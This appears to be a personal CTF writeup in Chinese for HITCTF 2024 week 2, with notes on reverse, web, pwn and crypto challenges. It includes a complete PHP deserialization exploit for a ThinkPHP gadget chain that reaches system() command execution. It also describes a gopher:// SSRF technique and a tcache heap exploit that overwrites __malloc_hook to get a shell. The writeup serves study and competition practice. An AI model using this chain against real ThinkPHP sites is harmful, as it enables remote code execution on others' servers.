---
title: hitctf2024-week2-writeup&notes
date: 2024-08-10 18:08:12
categories:
    - writeup
tags:
    - ctf
    - writeup
    - 笔记
katex: true
cover: https://yutori-natsu.github.io/images/wp2.jpeg
---
## Reverse

### Top5

五种不同的数据加密方法。enc1 与 enc3 为 TEA 系列加密方法，主要流程为将输入的 **8 字节明文**解析为 2 个 int64 进行若干次循环自然溢出增量。每次某个 int64 的增量均为另一个 int64 位移变换之后与某个字典值的异或结果。记两个 int64 为 a 和 b，则 TEA 系列加密算法最大的特征就是每轮循环的**三次更新**：a, b 与 index.

```python

# psuedo code
v1 = input[0:4]
v2 = input[4:8]
for i in range(0, PARAM_ROUNDS):
    v1 += F(v2) ^ Dict(index)
    v2 += F(v1) ^ Dict(index)
    index += delta
input[0:4] = v1
input[4:8] = v2

```

enc2 在 IDA 反汇编后暴露出了大小写字母+数字+符号的字典，推测为 base-x 类算法。此处使用的是最常见的 base64，其主要思想为将原文的**比特流**每 6 位作为一个数，在字典内进行编码。由于整除性质不一定总被满足，所以此处需要在结尾进行全 0 的 padding，最后的 padding 数可以由 000000 对应的字典字符在结尾连续出现的次数得出。

### Ez_maze

加壳。IDA 动态分析会有问题，原因未知。使用 OllyDbg 进行动态调试，通过 Step in till return 找到程序本身流程，分析为迷宫。

### sinke

CE 动态分析。对于这种动态的窗口程序，使用 Cheat Engine 也可以完成 IDA，OllyDbg 等调试器的基本功能（查看汇编、寄存器等）。CE 本身的封装使得对于内存值的动态调试更容易进行。
程序本身为图形化的贪吃蛇，动态分析加分前不变的内存值+加分后增加了的内存值，得到一个唯一结果。分析其相关内存和汇编行为发现目标分数的地址，因此在每次加分时的汇编处打上断点，在某次加分后修改内存，步进至完成流程后复原内存得到 flag.

## Web

### babyssrf

    PHP 提供了多种内置类来处理文件操作。以下是一些常用的文件处理相关的内置类：

    1. **SplFileObject**：用于读取和写入文件。它提供了多种方法来处理文件内容，例如按行读取、写入 CSV 文件等²。
    2. **SplFileInfo**：用于获取文件的详细信息，如文件名、路径、大小、权限等²。
    3. **DirectoryIterator**：用于遍历目录中的文件和子目录¹。
    4. **FilesystemIterator**：扩展了 DirectoryIterator，提供了更多的遍历选项和过滤功能¹。
    5. **RecursiveDirectoryIterator**：用于递归遍历目录及其子目录¹。

    源: 与 Copilot 的对话， 2024/8/10
    (1) php文件处理类中关于SplFileObject与SplFileInfo的具体详解 .... https://www.cnblogs.com/setevn/p/8821959.html.
    (2) php原生类的总结_php 原生类-CSDN博客. https://blog.csdn.net/unexpectedthing/article/details/121780909.
    (3) php有哪些对象 - 叮当号. https://www.dingdanghao.com/article/704244.html.
    (4) PHP 常见内置类浅析-腾讯云开发者社区-腾讯云. https://cloud.tencent.com/developer/article/2288295.

此处使用 SplFileObject 进行反序列化攻击。
具体来讲，index.php 的 curl 可以用于 ssrf，而 Message 类的 `__tostring()` 方法内有一句 `$con = new $this->contentType($this->content);`，假如此处的 contentType 是其它的类型便可用于攻击。此处传入一个 SplFileObject 类，其构造方法和 `__tostring()` 方法如下所示：

```php
public __construct(
    string $filename,
    string $mode = "r",
    bool $useIncludePath = false,
    ?resource $context = null
)
public __toString(): string // Returns the current line as a string.
```

在此处传入一个 `new SplFileObject('/flag')`，其在下文中的 `$res .= "<div class='ui message'>" . $con . "</div>";` 中便会将 `/flag` 文件第一行输出。
SSRF：此处只禁用了 `file:///` 协议，使用 `gopher://` 协议可以经过服务器向内网发送 TCP 数据流，由于 HTTP 在层级上位于 TCP 之上，因此可以通过 `gopher://` 协议通过 curl _exec 让服务器向内网发送伪造的 HTTP 请求。具体实现时，由于发往服务器的报文会被 URLdecode 一次，而从服务器向内网还要再 URLdecode 一次，所以向服务器发送报文时，伪造的 HTTP 请求需要进行**两次** URLencode.

### tp

docker 配置远程 PHP 解释器（见[文章](/2024/08/14/记一次-docker-配置远程-PHP-解释器/)）
[原始调用链](https://xz.aliyun.com/t/14904?time__1311=GqAh0K8KAKGNDQtiQGkDRDIhWL04ehnmD)

构造的调用链起点为 `class ResourceRegister->__destruct()`，进入 `class Resource->parseGroupRule()` 后在 `str_replace` 中触发某个 tostring 方法。
构造的调用链终点为 `class Validate->is()` 中的匿名函数，通过其中的 `$result = call_user_func_array($this->type[$rule], [$value]);` 完成 RCE. 为了到达这个匿名函数，需要调用 `class Validate->__call()`，这需要在外层找到一个调用 `class Validate->/*unknown method*/` 的入口。
框架中实现了 `trait Conversion->__tostring()`，在调用到 `appendAttrToArray` 进入 `getRelationWith` 时，可以通过 `$relation->visible($visible[$key])` 触发 `__call()` 方法。

```php
public function parseGroupRule($rule): void
    {
        $option = $this->option;
        $origin = $this->router->getGroup();
        $this->router->setGroup($this);

        if (str_contains($rule, '.')) {
            $array = explode('.', $rule);
            $last  = array_pop($array); # 构造 $rule
            $item  = [];
            foreach ($array as $val) {
                $item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';
            }
            $rule = implode('/', $item) . '/' . $last;
        }
        foreach ($this->rest as $key => $val) {
            # 构造 $this->rest
            if (isset($last) && 
                str_contains($val[1], '<id>') && 
                isset($option['var'][$last])) {
                    $val[1] = str_replace('<id>', '<' . $option['var'][$last] . '>', $val[1]);
            # 构造 $option['var'][$last]
```

从调用链的开头开始，`class ResourceRegister->register()` 的 `getRule()` 参数引用的 `$rule` 值是一个可以在初始化时指定的值。为了能够触发 tostring 方法，`parseGroupRule()` 中引用的 `$option = $this->option;` 也需要是一个能满足 `isset($option['var'][$last])` 的值，其中 `$last  = array_pop(explode('.', $rule));`，说明构造的 `$rule` 应该为 `str1.str2` 的形式，这样会有 `$last=str2`，所以必须构造 `$option=['var' => [str2 => val1]]`；另一个条件为 `str_contains($val[1], '<id>')`，说明 `$val=[1 => '<id>']` 而 `foreach ($this->rest as $key => $val)` 说明此处的 `$this->rest=[val2 => [1 => '<id>']]`，才能满足这个 if 的所有条件，触发 tostring。由于 if 内部的赋值为 `$val[1] = str_replace('<id>', '<' . $option['var'][$last] . '>', $val[1]);`，故触发 tostring 的对象为 `$option['var'][$last]`，即 `val1`，所以需要让 `val1` 的构造符合后续调用链的运行要求。

```php
protected function getRelationWith(string $key, array $hidden, array $visible)
{
    $relation = $this->getRelation($key, true);
    if ($relation) {
        if (isset($visible[$key])) {
            $relation->visible($visible[$key]);
            ...
public function __call($method, $args)
{
    array_push($args, lcfirst($method)); # [$args, $method]
    return call_user_func_array([$this, 'is'], $args);
}
public function is($value, string $rule, array $data = []): bool
{ # $value=$args, $rule=$method='visible'
    $call = function ($value, $rule) {
        if (isset($this->type[$rule])) {
            $result = call_user_func_array($this->type[$rule], [$value]);
```

在后续的 `__call` 方法之前，调用了 `$relation->visible($visible[$key]);`，所以为了调用 `class Validate->is()`，需要调用 `class Validate->__call()`，所以此处的 `$relation` 需要是一个 `class Validate` 对象。这个对象会成为后续 call 调用链中的 `$this`。调用了 `__call('visible', $visible[$key])` 之后，会进入 `is($visible[$key], 'visible)`。因此，此处需要有 `$this->type=['visible' => 'system']`，而 `$visible[$key]` （属于前文中的 `val1`）需要是一个可以被字符串化为最终命令的对象，在下文中记为 `ObjCmd`。

```php
foreach ($this->append as $key => $name) {
    $this->appendAttrToArray($item, $key, $name, $visible, $hidden);
}
protected function appendAttrToArray(array &$item, $key, array|string $name, array $visible, array $hidden): void
{
    if (str_contains($name, '.')) {
        [$key, $attr] = explode('.', $name);
        $relation = $this->getRelationWith($key, $hidden, $visible);
        ...
protected function getRelationWith(string $key, array $hidden, array $visible) # $key = str4, $hidden = null, $visible = [str4 => ObjCmd]
{
    $relation = $this->getRelation($key, true);
    if ($relation) {
```

在中间部分的调用链中，暂时有 `$this=val1`。此时从 `toArray` 进入 `appendAttrToArray` 的过程中，需要有 `$this->append=[val3 => str3]`，进入 `appendAttrToArray(null, val3, str3, ObjCmd, null)`。要正常进入 `getRelationWith`，需要此处的 `str3` 为 `str4.str5` 的形式。为了能够在 `getRelationWith` 进入后续的调用链，需要此处的 `$relation` 能正常返回。根据上文，此处的 `$relation` 需要是一个 `class Validate` 对象，所以在 `getRelation` 中需要有 `$this->relation=[str4 => class Validate]`。

总结以上要求，构造的初始对象暂时如下：

```php
class ResourceRegister {
    $rule = str1 . str2;
    $option = ['var' => [str2 => class something val1]]
        # val1 is a __tostring() callee
    $rest = ['123' => [1 => '<id>']]
}
class something val1 {
    $append = [val3 => str4 . str5]
    $visible = [str4 => ObjCmd]
    $relation = [str4 => class Validate val2]
}
class Validate val2 {
    $type=['visible' => 'system']
}
```

此时，需要补全的还有 `val1` 的类型和 `ObjCmd` 的类型。原文中选择了使用 `class Pivot` 实现 `val1`，`class ConstStub` 实现 `ObjCmd`。

```php
class ConstStub {
    public function __toString(): string {
        return (string) $this->value;
    }
}
abstract class Model implements JsonSerializable, ArrayAccess, Arrayable, Jsonable
class Pivot extends Model {}
```

在本题中，由于 `if (preg_match("/ConstStub/i",$data)) die("哒咩");` 对解码后的序列化字符串进行了正则判断，不能直接使用 `class ConstStub` 进行命令行命令的存储。此处尝试使用 `class Data` 代替，相关代码如下：

```php
public function __toString(): string
{
    $value = $this->getValue();

    if (!\is_array($value)) {
        return (string) $value;
    }
    ...
public function getValue(array|bool $recursive = false): string|int|float|bool|array|null
{
    $item = $this->data[$this->position][$this->key];

    if ($item instanceof Stub && Stub::TYPE_REF === $item->type && !$item->position) {
        $item = $item->value;
    }
    if (!($item = $this->getStub($item)) instanceof Stub) {
        return $item;
    }
    ...
private function getStub(mixed $item): mixed
{
    if (!$item || !\is_array($item)) {
        return $item;
    }
```

因此构造对象如下：

```php
class Data {
    $position = 1;
    $key = 2;
    $data = [1 => [2 => cmd]];
}
```

exp 根据原文修改如下：

```php
<?php
namespace think\route{
    class ResourceRegister{
        public $resource;

        public function __construct($resource) {
            $this->resource = $resource;
        }
    }

    class RuleGroup extends Rule{
        public function __construct($rule, $router, $option){
            parent::__construct($rule, $router, $option);
        }
    }

    class Resource extends RuleGroup{
        public function __construct($rule, $router, $option){
            parent::__construct($rule, $router, $option);
        }

    }

    abstract class Rule{ # chain part 1
        public $rest = ['key' => [1 => '<id>']];
        public $name = "name";
        public $rule;
        public $router;
        public $option;

        public function __construct($rule, $router, $option){
            $this->rule = $rule;
            $this->router = $router;
            $this->option = ['var' => ['nivia' => $option]];
        }
    }
}

namespace think {
    class Route{}
    abstract class Model{
        private $relation;
        protected $append = ['Nivia' => "1.2"];

        protected $visible;
        public function __construct($visible, $call){
            $this->visible = [1 => $visible];
            $this->relation = ['1' => $call];
        }
    }

    class Validate{
        protected $type;

        public function __construct(){
            $this->type = ['visible' => "system"];//function
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{ 
    # chain part 2, Model is Jsonable, calling __tostring()
        public function __construct($visible, $call){
            parent::__construct($visible, $call);
        }
    }
}

namespace Symfony\Component\VarDumper\Cloner{
	class Data {
	    private $position = 1;
	    private $key = 2;
	    private $data = [1 => [2 => 'cat /flag']];
	}
}

namespace {
    $call = new think\Validate;
    $option = new think\model\Pivot(new Symfony\Component\VarDumper\Cloner\Data, $call);
    $router = new think\Route;
    $resource = new think\route\Resource("abc.nivia", $router , $option);
    $resourceRegister = new think\route\ResourceRegister($resource);
    echo urlencode(base64_encode(serialize($resourceRegister)));
    // echo serialize($resourceRegister);
}
```

## Pwn

### EasyHeap

大坑！
前置知识：堆上分配内存块结构、内存块管理方式
内存块（chunk）主要包含 chunk header 和 user data，chunk header 中分别是 prev_size 和 size，user data 在该块闲置时开头为前向指针 fd 和后向指针 bk，结尾为按照块大小分类的前后向指针。
管理方式：主要分为 small / large / unsorted bin，fastbin 和 tcache(libc > 2.26)。tcache 是 64 个按照 chunk 大小分别建立的栈，安全性检查最少；fastbin 是优先级低于 tcache 的 chunk 栈，而剩余的 bin 是根据 chunk 大小和释放时机分别归类的三个 chunk 队列。
本题为 libc 2.27，故先申请若干个（此处为 10 个）chunk 和一个大 chunkS，然后依次释放前 8 个 chunk。此时 chunk 1 到 chunk 7 均位于 tcache，同时由于 chunk 8 大小较小，它会暂时位于 fast bin。此时再释放 chunkS，由于某些原因，在 chunkS 与 top chunk 合并后，chunk 8 会被置于 unsorted bin。由于 unsorted bin 的特性，此时 chunk 8 的 fd 指针会指向 unsorted bin 的初始节点，通过 Use After Free 可以得到一个和 main_arena 结构具有固定偏移的地址，当中保存的是 top chunk 的地址，然后是 unsorted bin 初始节点的前向与后向指针，然后是 small / large bin 等。此处使用了一个投机取巧的方法：程序的 ASLR 范围似乎不仅限于后 12 位，在这里达到了 20 位，且 libc 的基址与前文中 UAF 泄露的地址具有固定偏移量 `0x3ebca0`，故此处较为轻松地得到了 libc 的基址。
接下来的部分是基于 tcache 的 alloc to any address。释放一个 tcache 的 chunk 会导致 tcache 的栈顶指向该 chunk，从 tcache 中取出 chunk 进行分配时则会将该 chunk 的 fd 指针赋予栈顶。此处通过 UAF 对已经释放的 chunk 进行覆写，可以得到两个分别指向 `__malloc_hook` 和 `__realloc_hook` 的 chunk，通过 realloc 调整栈帧后由 onegadget 远程执行 shell。
观察内存，发现 `__realloc_hook` 处已有数据（貌似是特供版 libc 自带的默认值？），而 `__malloc_hook` 内没有，所以选择先构造指向 `__malloc_hook` 的 chunk，再构造指向 `__realloc_hook` 的 chunk，这样可以避免脏数据导致的一系列问题（又是一个以后再填的坑）。此处先将 chunk 7 的 fd 覆写为 `__malloc_hook`，然后调用两次 malloc，第一次malloc 会分配到 chunk 7，并导致 tcache 的栈顶指向 `__malloc_hook`，第二次 malloc 就能分配到指向 `__malloc_hook` 的 chunk 了。接下来 tcache 内还有 5 个已释放的 chunk，但栈顶已经指向了 NULL，所以此处需要额外释放别的 chunk。此处我选择的是依次释放 chunk 6 和 chunk 5，完成后栈顶指向 chunk 5，同样的覆写分配流程后就能得到指向 `__realloc_hook` 的 chunk，最后分别改写两处 hook 就能完成攻击流程。

## Crypto

### photoenc

加密的命令行指令为 `sm4-ecb`，将加密后的图片文件头修改为 `.bmp` 的文件头后就可以辨识flag.
TBD: ecb-

### mountain

线性组合加密，每 8 bytes 为一个 chunk，将该 chunk 作为一个 `1x8` 的行向量，右乘一个 `8x8` 的变换矩阵得到对应的加密行向量。逆向时由明文和密文可以对变换矩阵的每一列建立一个八元一次方程组来解出变换矩阵。获得变换矩阵后由于密文是由明文右乘变换矩阵得到的，故将密文右乘其伴随矩阵后乘以其行列式的逆元，在 mod n 意义下即为该 chunk 的明文。注意大数运算时初始值最好用 MMA 计算得到结果后直接写死，否则容易遇到浮点问题。

```plain
m[i] * K = c[i] 
m[i] * K * adjK = m[i] * |K| = c[i] * adjK
m[i] = c[i] * adjK * |K|^-1
```

### easybag

子集和问题，flag 被 AES 加密，而 AES 的密钥由背包方法加密。将密钥 key 的比特流看做一个 `1x64` 的行向量，生成 64 个随机数作为公钥向量与 key 向量求点积后的结果作为密文。用空间换时间可以有一个时空 `O(2^n/2)` 的暴力方法。
[通过 LLL 算法可以做到高效求解子集和问题？](https://www.ruanx.net/lattice-2/)
google sagemath online，每轮令 `S = c + k * p, k \in {0, 1, ...}`，本题解得 `k = 14`，将行向量最后一列去除后取反，编码为字节串后重复一次扩展至 16 字节字长后得到原始 AES 密钥，解密得到 flag.

### broadcast

类 RSA 算法，记明文为 m，`x = m^11`，给定 12 组 (r, p) 对满足 `x mod p[i] = r[i]`，求明文 m。
12 组 (r, p) 对可以直接解出 x，用 MMA 解这组同余方程后暴力对每个可能的答案求 `x^1/11`

### ex-ddddhm

比较复杂的 RSA 题。
给定各项参数：`n ~ 2^{1024}, e1 = 65537, c = m1^e1 mod n, e2 = 7,  bits(d2) = 1024, e1*d1 = e2*d2 = 1 (mod (p-1)(q-1))`
突破口在于第二组明文 `m2 = ddddhm` 以及对应的密文 `sig = m2^d2 mod n`，以及一组伪密文：`sigf[i] = m2^d2(i), d2(i) = d2 xor 1<<i, i \in {0,1,...,1024*2/3}`。由伪密文可以求出 d2 的低若干比特位：

```plain
若 d2[i]=0, 则 d2(i) = d2 + 1<<i, sigf[i] = m2^(d2 + 1<<i) = sig * m2^(1<<i) (mod n)
```

由于 `e2 = 7` 过小，考虑到 `e2*d2 = 1 (mod (p-1)(q-1))`，即 `e2*d2 = k(p-1)(q-1) + 1`，可以枚举 k，判断是否符合得到的低比特位，拼接得到完整的 d2。由于 `(p-1)(q-1) < pq = n`，可以解出 `k = 5`，进而解出 p, q，得到 d1 解密 flag
